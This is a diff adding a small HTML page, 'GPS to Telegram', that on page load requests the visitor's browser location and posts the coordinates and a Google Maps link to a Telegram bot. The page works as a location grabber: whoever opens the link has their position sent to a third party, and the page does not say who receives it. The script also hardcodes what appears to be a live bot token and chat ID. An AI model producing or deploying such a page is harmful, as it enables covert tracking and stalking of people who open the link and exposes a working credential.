@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>GPS to Telegram</title>
+    <script>
+      const botToken = "7552100955:AAH4L-GZJaU-OfTxnBl_Q44BkTRil0Hy2is"; // <-- Replace with your Bot token
+      const chatId = "1701447656"; // <-- Replace with your Chat ID
+
+      function sendLocation(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+
+        const message = `📍 New Location:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy} meters\nhttps://maps.google.com/?q=${lat},${lon}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        })
+        .then(() => {
+          document.body.innerHTML = "<h2 style='color:green;'>📬 Location sent to Telegram!</h2>";
+        })
+        .catch(err => {
+          console.error(err);
+          document.body.innerHTML = "<h2 style='color:red;'>❌ Failed to send to Telegram</h2>";
+        });
+      }
+
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(sendLocation, () => {
+            document.body.innerHTML = "<h2 style='color:red;'>❌ Permission Denied</h2>";
+          });
+        } else {
+          document.body.innerHTML = "<h2>❌ Geolocation not supported</h2>";
+        }
+      }
+
+      window.onload = getLocation;
+    </script>
+  </head>
+  <body>
+    <h2>📡 Tracking Location...</h2>
+  </body>
+</html>
